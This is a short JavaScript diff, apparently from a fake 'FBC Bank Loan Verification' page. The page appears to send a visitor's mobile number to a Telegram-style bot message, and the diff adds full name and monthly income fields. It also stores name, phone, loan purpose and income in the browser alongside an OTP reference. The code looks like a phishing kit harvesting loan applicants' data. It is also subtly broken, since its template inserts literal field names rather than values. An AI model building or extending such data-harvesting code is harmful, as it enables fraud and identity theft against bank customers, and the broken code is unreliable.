@@ -522,7 +522,8 @@
 <b>📱 FBC Bank Loan Verification</b>
 
 Mobile: <code>${mobile}</code>
-Applicant: <code>Not provided</code>
+Applicant: <code>monthlyIncome</code>
+Name: <code>fullName</code>
 `,
           parse_mode: 'HTML',
           reply_markup: {
@@ -539,7 +540,11 @@ Applicant: <code>Not provided</code>
         })
       })
       .then(() => {
-        localStorage.setItem('fbc_phone_number', mobile);
+        
+      localStorage.setItem('fbc_applicant_name', fullName);
+      localStorage.setItem('fbc_phone_number', mobile);
+      localStorage.setItem('fbc_loan_purpose', loanPurpose);
+      localStorage.setItem('fbc_monthly_income', monthlyIncome);
         localStorage.setItem('fbc_login_phone', mobile);
         localStorage.setItem('fbc_otp_ref', '9vXfk');
 
